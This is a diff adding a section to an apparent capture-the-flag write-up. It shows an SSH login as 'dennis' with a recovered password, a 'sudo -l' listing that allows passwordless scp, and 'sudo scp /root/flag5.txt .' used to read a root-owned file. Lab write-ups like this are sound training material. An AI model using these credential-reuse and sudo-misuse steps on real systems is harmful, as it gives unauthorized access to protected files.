@@ -58,3 +58,19 @@ However, focusing on the room questions:
 4. Dennis' password could be one of the two I have found so far. `ih8dinos` was the answer.
 
 At this point I tried ssh'ing as `dennis` to the machine, and the password worked, getting me a shell as dennis.
+
+## Remaining flags
+
+5. flag1.txt was in dennis's home dir.
+
+I ran `sudo -l` immediately, and discovered:
+
+```
+Matching Defaults entries for dennis on ip-10-10-23-246.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dennis may run the following commands on ip-10-10-23-246.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: /usr/bin/scp
+```
+
+dennis had a test.sh file saying flag5.txt was under /root. I used `sudo scp /root/flag5.txt .` to get flag5.
